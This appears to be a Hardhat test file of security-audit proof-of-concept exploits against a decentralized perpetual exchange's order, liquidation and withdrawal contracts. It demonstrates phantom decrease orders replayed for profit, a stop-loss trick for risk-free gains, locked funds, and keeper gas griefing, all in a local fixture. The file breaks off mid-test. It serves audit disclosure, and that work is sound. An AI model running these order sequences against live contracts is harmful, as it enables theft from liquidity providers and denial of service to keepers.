const { expect } = require("chai");
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");

const { deployFixture } = require("../../utils/fixture");
const { getOracleParams } = require("../../utils/oracle");
const { printGasUsage } = require("../../utils/gas");
const { bigNumberify, expandDecimals, expandFloatDecimals } = require("../../utils/math");
const { getBalanceOf } = require("../../utils/token");
const { OrderType } = require("../../utils/order");
const hre = require("hardhat");
const { network, ethers } = require("hardhat");
const { grantRole } = require("./../../utils/role");
const { PANIC_CODES } = require("@nomicfoundation/hardhat-chai-matchers/panic");

describe("Guardian POCs", () => {
  const executionFee = "1000000000000000";
  const { AddressZero, HashZero } = ethers.constants;
  const { provider } = ethers;

  let wallet, user0, user1, user2, signers, signerIndexes;
  let orderHandler,
    depositHandler,
    depositStore,
    feeReceiver,
    reader,
    dataStore,
    keys,
    orderStore,
    positionStore,
    ethUsdMarket,
    btcUsdMarket,
    weth,
    usdc,
    wbtc,
    liquidationHandler,
    roleStore,
    withdrawalStore,
    withdrawalHandler,
    exchangeRouter,
    increaseOrderUtils,
    decreaseOrderUtils,
    gasUtils;
  let oracleSalt;
  let marketUtils;

  beforeEach(async () => {
    const fixture = await loadFixture(deployFixture);
    ({ wallet, user0, user1, user2, signers } = fixture.accounts);
    ({
      orderHandler,
      depositHandler,
      depositStore,
      feeReceiver,
      reader,
      dataStore,
      keys,
      orderStore,
      positionStore,
      ethUsdMarket,
      btcUsdMarket,
      weth,
      usdc,
      wbtc,
      marketUtils,
      roleStore,
      withdrawalStore,
      withdrawalHandler,
      exchangeRouter,
      liquidationHandler,
      increaseOrderUtils,
      decreaseOrderUtils,
      gasUtils,
    } = fixture.contracts);
    ({ oracleSalt, signerIndexes } = fixture.props);

    await weth.mint(depositStore.address, expandDecimals(1000, 18));
    await depositHandler
      .connect(wallet)
      .createDeposit(user0.address, ethUsdMarket.marketToken, 100, false, executionFee);
    const depositKeys = await depositStore.getDepositKeys(0, 1);
    const deposit = await depositStore.get(depositKeys[0]);

    let block = await provider.getBlock(deposit.updatedAtBlock.toNumber());

    let oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [block.number, block.number],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    await depositHandler.executeDeposit(depositKeys[0], oracleParams);
  });

  it("CRITICAL::BNK-1 Swap orders with hasCollateralInEth == true lead to complete loss of funds", async () => {
    const USDC_AMOUNT = expandDecimals(50000, 6);
    const user0BalBefore = await ethers.provider.getBalance(user0.address);

    await usdc.mint(orderStore.address, USDC_AMOUNT);

    expect(await orderStore.getOrderCount()).eq(0);
    const params = {
      market: ethers.constants.AddressZero,
      initialCollateralToken: usdc.address,
      swapPath: [ethUsdMarket.marketToken],
      sizeDeltaUsd: 0,
      acceptablePrice: 0,
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: 0,
      orderType: OrderType.MarketSwap,
      isLong: true,
      hasCollateralInETH: true,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);

    let orderKeys = await orderStore.getOrderKeys(0, 1);

    let order = await orderStore.get(orderKeys[0]);

    let oracleBlockNumber = order.numbers.updatedAtBlock;
    let block = await provider.getBlock(oracleBlockNumber.toNumber());

    oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(1000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    // Order is still there in the store, but nobody can cancel it or execute it.
    await expect(orderHandler.executeOrder(orderKeys[0], oracleParams)).to.be.reverted;
    await expect(orderHandler.cancelOrder(orderKeys[0])).to.be.reverted;

    orderKeys = await orderStore.getOrderKeys(0, 1);
    order = await orderStore.get(orderKeys[0]);

    expect(order.numbers.initialCollateralDeltaAmount).to.eq(USDC_AMOUNT);
    const user0BalAfter = await ethers.provider.getBalance(user0.address);
    expect(user0BalBefore).to.eq(user0BalAfter);
  });

  it("MEDIUM::DPU-1 Cannot liquidate position whose pnl exactly negates their collateral", async () => {
    expect(await usdc.balanceOf(user0.address)).to.eq(0);
    await usdc.mint(orderStore.address, expandDecimals(50000, 6));

    expect(await weth.balanceOf(user0.address)).eq(0);

    expect(await orderStore.getOrderCount()).eq(0);
    const params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: usdc.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(100 * 1000), // 2x leverage
      acceptablePrice: expandDecimals(1000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: 0,
      orderType: OrderType.MarketIncrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);

    let orderKeys = await orderStore.getOrderKeys(0, 1);

    let order = await orderStore.get(orderKeys[0]);

    let oracleBlockNumber = order.numbers.updatedAtBlock;
    let block = await provider.getBlock(oracleBlockNumber.toNumber());

    let oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(1000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    await expect(orderHandler.executeOrder(orderKeys[0], oracleParams));

    await dataStore.setUint(await keys.MAX_LEVERAGE(), expandFloatDecimals(1));
    await dataStore.setUint(await keys.MIN_COLLATERAL_USD(), 0);

    await hre.network.provider.send("hardhat_mine", []);

    block = await provider.getBlock();

    let liquidationOracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [block.number, block.number],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(500, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });
    await grantRole(roleStore, wallet.address, "LIQUIDATION_KEEPER");

    // The position is unable to be liquidated due to division by 0
    await expect(
      liquidationHandler
        .connect(wallet)
        .liquidatePosition(user0.address, ethUsdMarket.marketToken, usdc.address, true, liquidationOracleParams)
    ).to.be.revertedWithPanic(PANIC_CODES.DIVISION_BY_ZERO);
  });

  it("CRITICAL::GLOBAL-1 market w/min + stop loss = low risk profit", async () => {
    await usdc.mint(orderStore.address, expandDecimals(50000, 6)); // $50,000

    expect(await orderStore.getOrderCount()).eq(0);
    const params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: usdc.address,
      swapPath: [ethUsdMarket.marketToken], // swap USDC for WETH
      sizeDeltaUsd: expandFloatDecimals(200 * 1000),
      acceptablePrice: expandDecimals(5000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: expandDecimals(11, 18),
      orderType: OrderType.MarketIncrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);
    // Order created
    expect(await orderStore.getOrderCount()).eq(1);

    let orderKeys = await orderStore.getOrderKeys(0, 1);
    let order = await orderStore.get(orderKeys[0]);

    let oracleBlockNumber = order.numbers.updatedAtBlock;
    let block = await provider.getBlock(oracleBlockNumber.toNumber());

    let badOracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(4600, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    // This order won't execute above ether price $50,000/11 = $4,545.4. Therefore, imitates a limit order.
    await expect(orderHandler.executeOrder(orderKeys[0], badOracleParams)).to.be.reverted;

    let oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(4500, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });
    // Will execute at this price
    await orderHandler.executeOrder(orderKeys[0], oracleParams);

    let posKeys = await positionStore.getPositionKeys(0, 1);
    let pos = await positionStore.get(posKeys[0]);
    expect(pos.collateralAmount).to.eq("11111111111111111111"); // Collateral / Oracle Price = 50,000/4500 = 11.11
    expect(pos.sizeInTokens).to.eq("44444444444444444444"); // Size Delta / Oracle Price = 200,000/4500 = 44.44

    const stopLossParams = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: weth.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(200 * 1000),
      acceptablePrice: expandDecimals(5000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: expandDecimals(0, 18),
      orderType: OrderType.StopLossDecrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, stopLossParams);

    expect(await orderStore.getOrderCount()).eq(1);
    orderKeys = await orderStore.getOrderKeys(0, 1);
    order = await orderStore.get(orderKeys[0]);
    oracleBlockNumber = order.numbers.updatedAtBlock;
    await network.provider.send("evm_mine");
    await network.provider.send("evm_mine");
    await network.provider.send("evm_mine");

    block = await provider.getBlock(oracleBlockNumber.add(1).toNumber());
    oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber.add(1), oracleBlockNumber.add(1), oracleBlockNumber.add(1)],
      blockHashes: [block.hash, block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address, weth.address],
      prices: [expandDecimals(5010, 4), expandDecimals(1, 6), expandDecimals(5000, 4)],
      signers,
      priceFeedTokens: [],
    });
    expect(await weth.balanceOf(user0.address)).to.eq(0);
    await orderHandler.executeOrder(orderKeys[0], oracleParams);
    // User profits without capital risk
    expect(await weth.balanceOf(user0.address)).to.eq("15546684408959858061"); // 11.11 + 4.44 = 15.55
  });

  it("CRITICAL::ORDU-1 limit increase must take prices at orderUpdatedAtBlock", async () => {
    await usdc.mint(orderStore.address, expandDecimals(50000, 6));

    expect(await orderStore.getOrderCount()).eq(0);
    const params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: usdc.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(100 * 1000),
      acceptablePrice: expandDecimals(5000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: expandDecimals(0, 18),
      orderType: OrderType.LimitIncrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);

    expect(await orderStore.getOrderCount()).eq(1);

    let orderKeys = await orderStore.getOrderKeys(0, 1);
    let order = await orderStore.get(orderKeys[0]);

    let oracleBlockNumber = order.numbers.updatedAtBlock;
    let block = await provider.getBlock(oracleBlockNumber.toNumber());
    await network.provider.send("evm_mine");
    let futureBlock = await provider.getBlock(oracleBlockNumber.add(1).toNumber());

    let futureOracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber.add(1), oracleBlockNumber.add(1)],
      blockHashes: [futureBlock.hash, futureBlock.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    // Cannot execute the limit increase at a block number that is past the order's updatedAtBlock
    await expect(orderHandler.executeOrder(orderKeys[0], futureOracleParams)).to.be.revertedWith("ORACLE_ERROR");

    let oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    // Limit increases are only able to be executed with prices from their orderUpdatedAtBlock, rendering them nearly useless
    await orderHandler.executeOrder(orderKeys[0], oracleParams);
    let posKeys = await positionStore.getPositionKeys(0, 1);
    let pos = await positionStore.get(posKeys[0]);

    expect(pos.sizeInTokens).to.eq(ethers.utils.parseEther("20")); // 20 ETH position
    expect(pos.sizeInUsd).to.eq(expandFloatDecimals(100000)); // $100,000
  });

  it("MEDIUM::ORDH-2 Phantom market decrease order", async () => {
    await usdc.mint(orderStore.address, expandDecimals(50000, 6));

    expect(await orderStore.getOrderCount()).eq(0);
    const params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: usdc.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(100 * 1000),
      acceptablePrice: expandDecimals(5000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: expandDecimals(0, 18),
      orderType: OrderType.MarketIncrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);

    expect(await orderStore.getOrderCount()).eq(1);

    let orderKeys = await orderStore.getOrderKeys(0, 1);
    let order = await orderStore.get(orderKeys[0]);

    let oracleBlockNumber = order.numbers.updatedAtBlock;
    let block = await provider.getBlock(oracleBlockNumber.toNumber());

    let oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    const tx0 = await orderHandler.executeOrder(orderKeys[0], oracleParams);
    let posKeys = await positionStore.getPositionKeys(0, 1);
    let pos = await positionStore.get(posKeys[0]);

    expect(pos.sizeInTokens).to.eq(ethers.utils.parseEther("20")); // 20 ETH position
    expect(pos.sizeInUsd).to.eq(expandFloatDecimals(100000)); // $100,000

    // Now that we have a position, let's create 2 decrease Orders
    const paramsDecrease = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: usdc.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(100 * 1000),
      acceptablePrice: expandDecimals(5000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: expandDecimals(0, 18),
      orderType: OrderType.MarketDecrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, paramsDecrease);
    await orderHandler.connect(wallet).createOrder(user0.address, paramsDecrease);

    expect(await orderStore.getOrderCount()).eq(2);

    orderKeys = await orderStore.getOrderKeys(0, 2);
    order = await orderStore.get(orderKeys[0]);

    oracleBlockNumber = order.numbers.updatedAtBlock;
    block = await provider.getBlock(oracleBlockNumber.toNumber());

    let decreaseOracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });
    // First decrease order is successful
    await orderHandler.executeOrder(orderKeys[0], decreaseOracleParams);

    // Second decrease order, reverts as it is for a now empty position.
    // It is not cancelled by the keeper
    posKeys = await positionStore.getPositionKeys(0, 1);
    expect(posKeys.length).to.eq(0);
    await expect(orderHandler.executeOrder(orderKeys[1], decreaseOracleParams)).to.be.revertedWith(
      "EMPTY_POSITION_ERROR"
    );
    // Phantom market decrease order, still exists
    expect(await orderStore.getOrderCount()).eq(1);

    // Now let's make another market increase
    await usdc.mint(orderStore.address, expandDecimals(50000, 6));
    await orderHandler.connect(wallet).createOrder(user0.address, params);
    expect(await orderStore.getOrderCount()).eq(2);

    orderKeys = await orderStore.getOrderKeys(0, 2);
    order = await orderStore.get(orderKeys[1]);
    expect(order.flags.orderType).to.eq(2); // MarketIncrease;
    let phantomDecreaseOrder = await orderStore.get(orderKeys[0]);
    expect(phantomDecreaseOrder.flags.orderType).to.eq(4); // MarketDecrease;

    oracleBlockNumber = order.numbers.updatedAtBlock;
    block = await provider.getBlock(oracleBlockNumber.toNumber());

    oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    // Execute new MarketIncrease order
    const increaseTx = await orderHandler.executeOrder(orderKeys[1], oracleParams);

    oracleBlockNumber = phantomDecreaseOrder.numbers.updatedAtBlock;
    block = await provider.getBlock(oracleBlockNumber.toNumber());

    decreaseOracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });
    // Execute phantom decrease order
    const decreaseTx = await orderHandler.executeOrder(orderKeys[0], decreaseOracleParams);
    posKeys = await positionStore.getPositionKeys(0, 1);
    expect(posKeys.length).to.eq(0); // No position
  });

  it("CRITICAL::GLOBAL-2 User can withdraw without depositing anything, the keeper tries to execute it and the execution is reverted without cancelling", async () => {
    /*
          Users are able to create withdrawals for 0 value and they continually fail without being canceled.
          This allows an attacker to expend the keepers gas in multiples of the executionFee they provide
          and potentially delay execution of other deposits, withdrawals, and orders.
        */
    const wethAmount = expandDecimals(10, 18);
    const usdcAmount = expandDecimals(10 * 5000, 6);

    let block = await provider.getBlock();

    expect(await withdrawalStore.getWithdrawalCount()).eq(0);
    await exchangeRouter
      .connect(user0)
      .createWithdrawal(ethUsdMarket.marketToken, wethAmount, usdcAmount, 0, 0, false, expandDecimals(0, 15));
    expect(await withdrawalStore.getWithdrawalCount()).eq(1);

    let withdrawalKeys = await withdrawalStore.getWithdrawalKeys(0, 1);
    let withdrawal = await withdrawalStore.get(withdrawalKeys[0]);

    expect(withdrawal.account).eq(user0.address);
    expect(withdrawal.market).eq(ethUsdMarket.marketToken);
    expect(withdrawal.marketTokensLongAmount).eq(wethAmount);
    expect(withdrawal.marketTokensShortAmount).eq(usdcAmount);
    expect(withdrawal.minLongTokenAmount).eq(0);
    expect(withdrawal.minShortTokenAmount).eq(0);
    expect(withdrawal.updatedAtBlock).eq(block.number + 1);

    block = await provider.getBlock(block.number + 1);
    const oracleBlockNumber = block.number;

    const oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    const withdrawalKeeperBalanceBefore = await ethers.provider.getBalance(wallet.address);

    // Try/catch does not catch this revert and order is not cancelled
    await expect(withdrawalHandler.executeWithdrawal(withdrawalKeys[0], oracleParams)).to.be.revertedWithPanic(
      PANIC_CODES.ARITHMETIC_UNDER_OR_OVERFLOW
    );
    // Withdrawal is still in the withdrawal store, the keeper may continue to attempt
    // to execute without success nor cancellation, therefore wasting gas and potentially
    // delaying the execution of other transactions on the exchange
    expect(await withdrawalStore.getWithdrawalCount()).eq(1);

    // Keeper attempts to retry the withdrawal, fails again
    await expect(withdrawalHandler.executeWithdrawal(withdrawalKeys[0], oracleParams)).to.be.revertedWithPanic(
      PANIC_CODES.ARITHMETIC_UNDER_OR_OVERFLOW
    );

    const withdrawalKeeperBalanceAfter = await ethers.provider.getBalance(wallet.address);
    // Notice that the keeper expends more gas than the user initially provided with the executionFee
    expect(withdrawalKeeperBalanceBefore.sub(withdrawalKeeperBalanceAfter)).to.be.gt(executionFee);
  });

  it("HIGH::GLOBAL-3 Decrease order lacks cross-liquidity to execute", async () => {
    expect(await usdc.balanceOf(ethUsdMarket.marketToken)).eq(0);
    expect(await getBalanceOf(weth.address, ethUsdMarket.marketToken)).to.eq("999999000000000000000");

    await usdc.mint(orderStore.address, expandDecimals(50000, 6));

    expect(await orderStore.getOrderCount()).eq(0);
    const params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: usdc.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(1000 * 1000),
      acceptablePrice: expandDecimals(5000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: expandDecimals(0, 18),
      orderType: OrderType.MarketIncrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);
    expect(await orderStore.getOrderCount()).eq(1);

    let orderKeys = await orderStore.getOrderKeys(0, 1);
    let order = await orderStore.get(orderKeys[0]);

    let oracleBlockNumber = order.numbers.updatedAtBlock;
    let block = await provider.getBlock(oracleBlockNumber.toNumber());

    let oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    // Open a position with $50,000 usdc collateral @ 20x long eth
    const initIncreaseOrder = await orderHandler.executeOrder(orderKeys[0], oracleParams);
    let posKeys = await positionStore.getPositionKeys(0, 1);
    let pos = await positionStore.get(posKeys[0]);
    expect(pos.sizeInUsd).to.eq(expandFloatDecimals(1000000)); // $1,000,000
    expect(await usdc.balanceOf(ethUsdMarket.marketToken)).eq(expandDecimals(50000, 6));

    // Now that we have a position, let's create a decrease order
    const paramsDecrease = {
      market: ethUsdMarket.marketToken,
      // Must provide usdc as the initialCollateralToken -- as the initial position
      // was opened with usdc as collateral and positions are keyed based on initialCollateralToken
      initialCollateralToken: usdc.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(1000 * 1000),
      acceptablePrice: expandDecimals(5000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: expandDecimals(0, 18),
      orderType: OrderType.MarketDecrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, paramsDecrease);
    expect(await orderStore.getOrderCount()).eq(1);

    orderKeys = await orderStore.getOrderKeys(0, 1);
    let decreaseKey = orderKeys[0];
    let decreaseOrder = await orderStore.get(decreaseKey);

    let decreaseOracleBlockNumber = decreaseOrder.numbers.updatedAtBlock;
    let decreaseBlock = await provider.getBlock(decreaseOracleBlockNumber.toNumber());

    let decreaseOracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [decreaseOracleBlockNumber, decreaseOracleBlockNumber],
      blockHashes: [decreaseBlock.hash, decreaseBlock.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5001, 4), expandDecimals(1, 6)], // Price up by only $1
      signers,
      priceFeedTokens: [],
    });

    // Notice that the user is unable to withdraw their profit or recoup any of their
    // collateral, until more usdc liquidity is available.
    await expect(orderHandler.executeOrder(decreaseKey, decreaseOracleParams)).to.be.revertedWithCustomError(
      marketUtils,
      "InsufficientPoolAmount"
    );
    // However there is more than enough ether in the market to allow the user to withdraw their collateral + profit
    // But because the position is keyed based on initialCollateralToken, the user cannot
    // use this capital -- even though they have a right to it.
    expect(await getBalanceOf(weth.address, ethUsdMarket.marketToken)).to.eq("999999000000000000000");
    decreaseOrder = await orderStore.get(decreaseKey);
    // Decrease order still in store due to revert
    expect(decreaseOrder.numbers.sizeDeltaUsd).to.be.eq(expandFloatDecimals(1000 * 1000));
  });

  it("CRITICAL::DOU-1 Can create a phantom MarketDecrease order to game the exchange", async () => {
    // Increase order at size x, decrease at size y where y > x, decrease still exists at size x
    // post-execution. This means the prices from the block the decrease order was created
    // can be used to someone's advantage.

    // Increase order -> decrease order -> increase order executed -> decrease order executed
    // 0 position and a decrease order
    // create an increase order, execute it ($4500 at block 50), then I can execute decrease order ($5000 at block 1) and make profit

    await weth.mint(orderStore.address, expandDecimals(1000, 18));

    expect(await orderStore.getOrderCount()).eq(0);
    const params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: weth.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(100 * 1000),
      acceptablePrice: expandDecimals(5000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: expandDecimals(0, 18),
      orderType: OrderType.MarketIncrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);
    expect(await orderStore.getOrderCount()).eq(1);

    let orderKeys = await orderStore.getOrderKeys(0, 1);
    let order = await orderStore.get(orderKeys[0]);

    let oracleBlockNumber = order.numbers.updatedAtBlock;
    let block = await provider.getBlock(oracleBlockNumber.toNumber());

    let oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    const tx0 = await orderHandler.executeOrder(orderKeys[0], oracleParams);
    let posKeys = await positionStore.getPositionKeys(0, 1);
    let pos = await positionStore.get(posKeys[0]);
    expect(pos.sizeInUsd).to.eq(expandFloatDecimals(100000)); // $100,000

    // Now that we have a position, let's create a decrease order that is greater in usdSize than the increase
    const paramsDecrease = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: weth.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(100 * 1001),
      acceptablePrice: expandDecimals(5000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: expandDecimals(0, 18),
      orderType: OrderType.MarketDecrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, paramsDecrease);
    expect(await orderStore.getOrderCount()).eq(1);

    orderKeys = await orderStore.getOrderKeys(0, 1);
    order = await orderStore.get(orderKeys[0]);

    let decreaseOracleBlockNumber = order.numbers.updatedAtBlock;
    let decreaseBlock = await provider.getBlock(decreaseOracleBlockNumber.toNumber());

    let decreaseOracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [decreaseOracleBlockNumber, decreaseOracleBlockNumber],
      blockHashes: [decreaseBlock.hash, decreaseBlock.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });
    const tx1 = await orderHandler.executeOrder(orderKeys[0], decreaseOracleParams);
    // At this point we should no longer have a position, and we should have a decrease order in the store
    posKeys = await positionStore.getPositionKeys(0, 1);
    expect(posKeys.length).to.eq(0);
    let wethBefore = await weth.balanceOf(user0.address);

    // Phantom market decrease order -- exists with the size of the position you just removed
    expect(await orderStore.getOrderCount()).eq(1);
    orderKeys = await orderStore.getOrderKeys(0, 1);
    order = await orderStore.get(orderKeys[0]);
    expect(order.numbers.sizeDeltaUsd).to.eq(expandFloatDecimals(100 * 1000));

    // Now let's make another market increase
    await weth.mint(orderStore.address, expandDecimals(1000, 18));
    await orderHandler
      .connect(wallet)
      .createOrder(user0.address, { ...params, sizeDeltaUsd: expandFloatDecimals(99 * 1000) });
    expect(await orderStore.getOrderCount()).eq(2);

    // Verify both order types are present
    orderKeys = await orderStore.getOrderKeys(0, 2);
    order = await orderStore.get(orderKeys[1]);
    expect(order.flags.orderType).to.eq(2); // MarketIncrease;
    let phantomDecreaseOrder = await orderStore.get(orderKeys[0]);
    expect(phantomDecreaseOrder.flags.orderType).to.eq(4); // MarketDecrease;

    oracleBlockNumber = order.numbers.updatedAtBlock;
    block = await provider.getBlock(oracleBlockNumber.toNumber());

    oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(1000, 4), expandDecimals(1, 6)], // price is lower than that of decrease
      signers,
      priceFeedTokens: [],
    });

    // Execute new MarketIncrease order
    const increaseTx = await orderHandler.executeOrder(orderKeys[1], oracleParams);
    posKeys = await positionStore.getPositionKeys(0, 1);
    pos = await positionStore.get(posKeys[0]);
    expect(pos.sizeInUsd).to.eq(expandFloatDecimals(99000)); // $99,000

    let wackBlock = await provider.getBlock();
    let wackDecreaseOracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [wackBlock.number, wackBlock.number],
      blockHashes: [wackBlock.hash, wackBlock.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });
    // Keeper MUST provide prices at block decrease order was created
    await expect(orderHandler.executeOrder(orderKeys[0], wackDecreaseOracleParams)).to.be.revertedWith("ORACLE_ERROR");

    // Execute phantom decrease order
    const decreaseTx = await orderHandler.executeOrder(orderKeys[0], decreaseOracleParams);
    let wethAfter = await weth.balanceOf(user0.address);
    expect(wethAfter).to.be.gt(wethBefore.add(ethers.utils.parseEther("1000"))); // user made money against his phantom decrease order

    posKeys = await positionStore.getPositionKeys(0, 1);
    expect(posKeys.length).to.eq(0); // No position

    // Decrease order still exists so attacker can keep doing it over and over again!
    orderKeys = await orderStore.getOrderKeys(0, 1);
    order = await orderStore.get(orderKeys[0]);
